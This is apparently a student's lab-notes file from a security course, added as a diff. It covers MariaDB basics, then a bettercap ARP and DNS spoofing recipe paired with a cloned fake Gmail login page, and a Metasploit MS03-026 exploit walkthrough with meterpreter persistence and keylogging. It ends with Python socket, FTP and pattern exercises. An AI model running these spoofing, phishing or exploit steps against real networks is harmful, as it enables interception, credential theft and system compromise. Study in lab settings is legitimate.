@@ -1,0 +1,434 @@
+				SQL Commands
+----------------------------------------------------------------------------------------
+>sudo apt-get install mariadb-server
+>sudo mysql -u root -p
+
+mariaDb > show databases;
+	> create database if not exits newdb;
+	> use newdb;
+	> show tables;
+	> create table users(
+		id int(5) not null auto_increment,
+		username varchar(30) not null,
+		password varchar(30) not null,
+		primary key(id),
+		unique(username)
+		);
+	> show tables;
+	> desc users;
+	> select id, username, password from users;
+	> select * from users
+	> insert into users values(1, 'tinku', 'tinku@123');
+	> select * from users;
+	> select * from users where id=2;
+	> select * from users;
+	> update users set password='gabbar123' where id=3;
+	> select * from users;
+	> desc users;
+	> alter table users add column fname varchar(50) not null after id;
+	> desc users;
+	> select * from users;
+	> exit
+
+>cd
+>mkdir db_backup
+>cd db_backup
+>sudo chmod 777 db_backup
+>sudo mysqldump --user root newdb > newdb.sql
+>ls -l
+>sudo mysql -u root -p
+
+mariaDb	> select * from users;
+	> delete from users where id=3;
+	> select * from users;
+	> desc users;
+	> drop table users;
+	> drop database newdb;
+	
+
+>sudo mysql -u root -p newdb < db.sql
+>sudo mysql -u root -p
+
+mariaDb	> use db;
+	> select * from users;
+	> show databases;
+	> use db;
+
+To create user in localhost:-
+mariaDb[mysql]	> create user 'tinku'@localhost identified by 'pass@123';
+		> select * from users;
+		> grant all privileges on new_db.* to 'tinku'@localhost;
+
+sudo mysql -u tinku -p
+Enter tinku password
+------------------------------------------------------------------------------------------------------------
+
+				Spoofing
+    sudo apt-get install ca-certificates libnetfilter-queue-dev libpcap-dev unzip wget
+    1  sudo mkdir bettercap
+    3  cd bettercap/
+    6  sudo apt install vsftpd
+   21  sudo wget https://www.shuharilabs.local/sw/vapt/Spoofing/bettercap_linux_amd64_v2.28.zip
+   24  sudo unzip bettercap_linux_amd64_v2.28.zip
+   25  ls
+   26  ./bettercap --version
+   27  sudo nano spoof.cap
+	-> 	net.probe on
+		
+		set arp.spoof.fullduplex true
+		set arp.spoof.targets 192.168.80.131(victim)
+		arp.spoof on
+		
+		set net.sniff.local true
+		net.sniff on -> save it
+   28  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   	sudo apt-get install apache2
+	sudo rm /var/www/html/index.html
+	sudo apt-get install git
+	git clone https://vamsheeth/gmail-login.git
+   29  sudo nano spoof.cap
+	->	net.probe on
+		
+		set arp.spoof.fullduplex true
+		set arp.spoof.targets 192.168.80.131(victim)
+		arp.spoof on
+		
+		set net.sniff.local true
+		net.sniff on
+		
+		set dns.spoof.all true
+		set dns.spoof.domains iacsd.com
+		dns.spoof on -> save it
+   30  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   31  sudo systemctl apache2
+   32  sudo apt install apache2
+   33  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   34  history
+------------------------------------------------------------------------------------------------------
+
+				Exploit
+Kali
+msfconsole
+1 search ms03-026
+2  use exploit/windows/dcerpc/ms03_026_dcom
+3  show options
+4  set PAYLOAD windows/meterpreter/bind_tcp
+5  show options
+6  set RHOST 192.168.80.134
+7  show options
+8  exploit
+9  windowsxp task manager (ctrl+alt+dlt)
+10 svchosts.exe file see
+11 meterpreter - netstat -anp tcp
+12 run metsvc
+13 getpid
+14 getuid
+15 migrate (1776)-number of explorer.exe
+16 ps
+17 getpid getuid 
+18 winxp- open point notepad
+19 kali- ps (take pid of paint, notepad)
+20 kali - kill -----(pid of mspaint)
+21 keyscan_start
+23 windows- type something on notepad
+24 kali- keyscan_dump O/P- (whatever wrote on notepad)
+------------------------------------------------------------------------------------------------------------
+			
+				Socket Programming
+1)Data Output
+Deb	>python3
+	>import socket
+	>TCPSocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
+	>TCPSocket.bind(("0.0.0.0", 8000))
+	>TCPSocket.listen()
+	>(clientSocket, (ip, port)) = TCPSocket.accept()
+
+kali	>telnet 192.168.80.128 8000
+
+Deb	>ip
+	>port
+	>client socket.send(b"\n Python Rocks \n")
+	>data=clientSocket.recv(2048)
+	>print(data)
+	o/p python rocks
+	>clientSocket.close()
+	>TCPSocket.close()
+
+2)File Transfer
+#!/usr/bin/python
+
+import socket
+
+def main():
+	s=socket.socket(socket.AF_INET, socket.sock_STREAM)
+	s.connect(('192.168.80.130', 21))
+	data = s.recv(1024)
+	print(data)
+	s.send('USER ftp'.encode('UTF-8') + '\r\n'.encode('UTF-8'))
+	data = s.recv(1024)
+	print(data)
+	s.send('PASS ftp'.encode('UTF-8') + '\r\n'.encode('UTF-8'))
+	data = s.recv(1024)
+	print(data)
+
+if __name__=='__main__':
+	main()
+--------------------------------------------------------------------------------------------------------------
+
+			python programs
+->Write a Program to identify unique MAC addresses from the file.
+# Python Program to compute
+# MAC address of host
+# using UUID module
+
+import uuid
+
+# printing the value of unique MAC
+# address using uuid and getnode() function 
+print (hex(uuid.getnode()))
+
+		OR
+
+# Python 3 code to print MAC
+# in formatted way.
+
+import uuid
+
+# joins elements of getnode() after each 2 digits.
+
+print ("The MAC address in formatted way is : ", end="")
+print (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
+for ele in range(0,8*6,8)][::-1]))
+
+Pattern Programs
+1)# Python 3.x code to demonstrate star pattern
+
+# Function to demonstrate printing pattern
+def pypart(n):
+	
+	# outer loop to handle number of rows
+	# n in this case
+	for i in range(0, n):
+	
+		# inner loop to handle number of columns
+		# values changing acc. to outer loop
+		for j in range(0, i+1):
+		
+			# printing stars
+			print("* ",end="")
+	
+		# ending line after each row
+		print("\r")
+
+# Driver Code
+n = 5
+pypart(n)
+
+2)# Python 3.x code to demonstrate star pattern
+
+# Function to demonstrate printing pattern
+def pypart2(n):
+	
+	# number of spaces
+	k = 2*n - 2
+
+	# outer loop to handle number of rows
+	for i in range(0, n):
+	
+		# inner loop to handle number spaces
+		# values changing acc. to requirement
+		for j in range(0, k):
+			print(end=" ")
+	
+		# decrementing k after each loop
+		k = k - 2
+	
+		# inner loop to handle number of columns
+		# values changing acc. to outer loop
+		for j in range(0, i+1):
+		
+			# printing stars
+			print("* ", end="")
+	
+		# ending line after each row
+		print("\r")
+
+# Driver Code
+n = 5
+pypart2(n)
+
+3)# Python 3.x code to demonstrate star pattern
+
+# Function to demonstrate printing pattern triangle
+def triangle(n):
+	
+	# number of spaces
+	k = n - 1
+
+	# outer loop to handle number of rows
+	for i in range(0, n):
+	
+		# inner loop to handle number spaces
+		# values changing acc. to requirement
+		for j in range(0, k):
+			print(end=" ")
+	
+		# decrementing k after each loop
+		k = k - 1
+	
+		# inner loop to handle number of columns
+		# values changing acc. to outer loop
+		for j in range(0, i+1):
+		
+			# printing stars
+			print("* ", end="")
+	
+		# ending line after each row
+		print("\r")
+
+# Driver Code
+n = 5
+triangle(n)
+
+4)# Python 3.x code to demonstrate star pattern
+
+# Function to demonstrate printing pattern of numbers
+def numpat(n):
+	
+	# initialising starting number 
+	num = 1
+
+	# outer loop to handle number of rows
+	for i in range(0, n):
+	
+		# re assigning num
+		num = 1
+	
+		# inner loop to handle number of columns
+			# values changing acc. to outer loop
+		for j in range(0, i+1):
+		
+				# printing number
+			print(num, end=" ")
+		
+			# incrementing number at each column
+			num = num + 1
+	
+		# ending line after each row
+		print("\r")
+
+# Driver code
+n = 5
+numpat(n)
+
+5)# Python 3.x code to demonstrate star pattern
+
+# Function to demonstrate printing pattern of numbers
+def contnum(n):
+	
+	# initializing starting number 
+	num = 1
+
+	# outer loop to handle number of rows
+	for i in range(0, n):
+	
+		# not re assigning num
+		# num = 1
+	
+		# inner loop to handle number of columns
+		# values changing acc. to outer loop
+		for j in range(0, i+1):
+		
+			# printing number
+			print(num, end=" ")
+		
+			# incrementing number at each column
+			num = num + 1
+	
+		# ending line after each row
+		print("\r")
+
+n = 5
+
+# sending 5 as argument
+# calling Function
+contnum(n)
+
+6)# Python 3.x code to demonstrate star pattern
+
+# Function to demonstrate printing pattern of alphabets
+def alphapat(n):
+	
+	# initializing value corresponding to 'A' 
+	# ASCII value
+	num = 65
+
+	# outer loop to handle number of rows
+	# 5 in this case
+	for i in range(0, n):
+	
+		# inner loop to handle number of columns
+		# values changing acc. to outer loop
+		for j in range(0, i+1):
+		
+			# explicitly converting to char
+			ch = chr(num)
+		
+			# printing char value 
+			print(ch, end=" ")
+	
+		# incrementing number
+		num = num + 1
+	
+		# ending line after each row
+		print("\r")
+
+# Driver Code
+n = 5
+alphapat(n)
+
+7)# Python code 3.x to demonstrate star pattern
+
+# Function to demonstrate printing pattern of alphabets
+
+
+def contalpha(n):
+
+	# initializing value corresponding to 'A'
+	# ASCII value
+	num = 65
+
+
+	# outer loop to handle number of rows
+- for i in range(0, n):
+
+	# inner loop to handle number of columns
+	# values changing acc. to outer loop
+	for j in range(0, i+1):
+
+		# explicitly converting to char
+		ch = chr(num)
+
+		# printing char value
+		print(ch, end=" ")
+
+		# incrementing at each column
+		num = num + 1
+
+	# ending line after each row
+	print("\r")
+
+# Driver code
+n = 5
+contalpha(n)
+
+8)n = 5
+alph = 65
+for i in range(0, n):
+	print(" " * (n-i), end=" ")
+	for j in range(0, i+1):
+		print(chr(alph), end=" ")
+		alph += 1
+	alph = 65
+	print()
+
